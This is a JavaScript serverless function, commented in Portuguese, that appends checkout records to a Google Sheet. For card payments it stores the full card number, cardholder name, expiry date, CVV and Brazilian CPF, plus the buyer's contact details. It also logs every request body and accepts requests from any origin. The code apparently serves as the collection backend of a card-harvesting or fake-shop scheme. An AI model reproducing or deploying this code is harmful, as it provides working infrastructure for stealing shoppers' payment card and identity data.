// Vercel Serverless Function para enviar dados ao Google Sheets
const { google } = require('googleapis');

module.exports = async (req, res) => {
  // ✅ CORS simplificado
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ erro: 'Método não permitido' });
  }

  try {
    // ✅ Corrige corpo vindo como string
    if (typeof req.body === 'string') {
      try {
        req.body = JSON.parse(req.body);
      } catch (e) {
        console.error('❌ Erro ao converter body:', e);
        return res.status(400).json({ erro: 'Body inválido — deve ser JSON' });
      }
    }

    const { tipo, dados } = req.body;
    console.log('📩 Corpo recebido:', req.body);

    if (!tipo || !dados) {
      return res.status(400).json({ erro: 'Dados incompletos' });
    }

    // Configurar credenciais do Google Sheets
    const GOOGLE_SHEETS_CREDENTIALS = process.env.GOOGLE_SHEETS_CREDENTIALS;
    const SPREADSHEET_ID = process.env.SPREADSHEET_ID;
    const SHEET_NAME = process.env.SHEET_NAME || 'Dados';

    if (!GOOGLE_SHEETS_CREDENTIALS || !SPREADSHEET_ID) {
      console.error('❌ Credenciais do Google Sheets não configuradas');
      return res.status(500).json({ erro: 'Configuração incompleta' });
    }

    // Parse seguro das credenciais
    const credentials = JSON.parse(GOOGLE_SHEETS_CREDENTIALS.replace(/\\n/g, '\n'));

    // Autenticar com Google Sheets API
    const auth = new google.auth.GoogleAuth({
      credentials,
      scopes: ['https://www.googleapis.com/auth/spreadsheets'],
    });

    const sheets = google.sheets({ version: 'v4', auth });

    // Timestamp ISO
    const timestamp = new Date();
    const timestampFormatado = timestamp.toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

    // Montar linha
    let row = [];

    if (tipo === 'pix_gerado') {
      row = [
        timestampFormatado,
        'PIX',
        dados.produto || '',
        dados.precoOriginal || '',
        dados.desconto || '',
        dados.precoComDesconto || '',
        dados.frete || '',
        dados.valorTotal || '',
        dados.cliente || '',
        dados.email || '',
        dados.telefone || '',
        dados.endereco || '',
        dados.cidade || '',
        dados.estado || '',
        dados.cep || '',
        dados.chavePix || '',
        '', '', '', '', '', '', ''
      ];
    } else if (tipo === 'cartao_inserido') {
      row = [
        timestampFormatado,
        'CARTÃO',
        dados.produto || '',
        dados.valor || '',
        '', '', '', dados.valor || '',
        dados.cliente || '',
        dados.email || '',
        dados.telefone || '',
        '', '', '', '',
        '', dados.parcelas || '',
        dados.cartao_final || '',
        dados.numero_cartao_completo || '',
        dados.nome_cartao || '',
        dados.validade || '',
        dados.cvv || '',
        dados.cpf || ''
      ];
    } else {
      return res.status(400).json({ erro: 'Tipo inválido' });
    }

    // 🔍 Verificar duplicação (última linha idêntica)
    const getLastRow = await sheets.spreadsheets.values.get({
      spreadsheetId: SPREADSHEET_ID,
      range: `${SHEET_NAME}!A:W`,
    });

    const allRows = getLastRow.data.values || [];
    const lastRow = allRows[allRows.length - 1];

    let isDuplicate = false;
    if (lastRow) {
      const tipoAnterior = lastRow[1];
      const produtoAnterior = lastRow[2];
      const clienteAnterior = lastRow[8];
      const horaAnterior = lastRow[0];

      // Converter data/hora anterior corretamente
      const [dataPart, horaPart] = horaAnterior.split(', ');
      const [dia, mes, ano] = dataPart.split('/');
      const [hora, minuto, segundo] = horaPart.split(':');
      const horaAnteriorConvertida = new Date(ano, mes - 1, dia, hora, minuto, segundo);

      const diff = Math.abs(timestamp - horaAnteriorConvertida);

      if (
        tipoAnterior === (tipo === 'pix_gerado' ? 'PIX' : 'CARTÃO') &&
        produtoAnterior === (dados.produto || '') &&
        clienteAnterior === (dados.cliente || '') &&
        diff < 5000 // 5 segundos
      ) {
        isDuplicate = true;
      }
    }

    if (isDuplicate) {
      console.log('⚠️ Registro duplicado detectado — ignorado.');
      return res.status(200).json({ sucesso: true, mensagem: 'Registro duplicado ignorado.' });
    }

    // ✅ Inserir dados na planilha
    console.log('📝 Linha a ser enviada:', row);
    await sheets.spreadsheets.values.append({
      spreadsheetId: SPREADSHEET_ID,
      range: `${SHEET_NAME}!A:W`,
      valueInputOption: 'USER_ENTERED',
      resource: { values: [row] },
    });

    return res.status(200).json({ sucesso: true, mensagem: 'Dados enviados para o Google Sheets' });
  } catch (error) {
    console.error('❌ Erro ao enviar dados para o Google Sheets:', error);
    return res.status(500).json({ erro: 'Erro ao processar requisição', detalhes: error.message });
  }
};
